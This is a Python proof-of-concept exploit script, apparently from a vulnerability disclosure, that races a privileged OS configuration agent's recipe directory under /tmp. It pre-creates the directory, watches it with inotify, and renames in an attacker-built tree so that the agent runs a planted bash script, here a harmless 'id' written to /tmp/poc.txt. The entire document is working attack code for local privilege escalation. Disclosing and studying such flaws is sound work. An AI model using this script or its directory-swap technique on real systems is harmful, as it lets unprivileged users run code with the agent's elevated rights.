#!/usr/bin/python3

import os
import time
from inotify_simple import INotify, flags

TMP_RUNDIR_NAME = "xxx-rundir"
P_OSSR_LEGIT = "/tmp/osconfig_software_recipes"
time_suffix = str(int(time.time()))
P_OSSR_MALI = P_OSSR_LEGIT+".mali"+time_suffix
P_OSSR_MALI_TMP_RECIPEDIR = os.path.join(P_OSSR_MALI, "xxx-recipe-name")
P_OSSR_MALI_TMP_RUNDIR = os.path.join(P_OSSR_MALI_TMP_RECIPEDIR, TMP_RUNDIR_NAME)
P_OSSR_MALI_TMP_STEPDIR = os.path.join(P_OSSR_MALI_TMP_RUNDIR, "step00")
P_OSSR_MALI_TMP_RECIPE_SOURCE = os.path.join(P_OSSR_MALI_TMP_STEPDIR, "recipe_script_source")

if os.path.lexists(P_OSSR_LEGIT):
    raise Exception(f"{P_OSSR_LEGIT} already exists, takeover is not possible")

print(f"Running as {os.getuid()}")

os.makedirs(P_OSSR_LEGIT)
os.makedirs(P_OSSR_MALI_TMP_STEPDIR)

text_file = open(P_OSSR_MALI_TMP_RECIPE_SOURCE, "w")
text_file.write('#!/bin/bash\nid\nid >> /tmp/poc.txt\n')
text_file.close()

os.chmod(P_OSSR_MALI_TMP_RECIPE_SOURCE, 0o755)

inotify = INotify()
watch_flags = flags.CREATE
inotify.add_watch(P_OSSR_LEGIT, watch_flags)

print("calling inotify.read()")
events = inotify.read()
event = events[0]
print(event)
legit_recipedir = os.path.join(P_OSSR_LEGIT, event.name)
mali_recipedir = os.path.join(P_OSSR_MALI, event.name)
os.rename(P_OSSR_MALI_TMP_RECIPEDIR, mali_recipedir)
print(f"New recipe: {event.name}, rename: {P_OSSR_MALI_TMP_RECIPEDIR} -> {mali_recipedir}")
rundirs = os.listdir(legit_recipedir) # it was created with mkdirAll, so it must exist at this point already
rundir_name = rundirs[0]
legit_rundir = os.path.join(legit_recipedir, rundir_name)
inotify.add_watch(legit_rundir, watch_flags)
mali_rundir = os.path.join(mali_recipedir, rundir_name)
mali_tmp = os.path.join(mali_recipedir, TMP_RUNDIR_NAME)
os.rename(mali_tmp, mali_rundir)
print(f"New rundir {event.name}, rename: {mali_tmp} -> {mali_rundir}")
stepdir_name = "step00"
legit_stepdir = os.path.join(legit_rundir, stepdir_name)
os.rename(P_OSSR_LEGIT, P_OSSR_LEGIT+".legit")
os.rename(P_OSSR_MALI, P_OSSR_LEGIT)

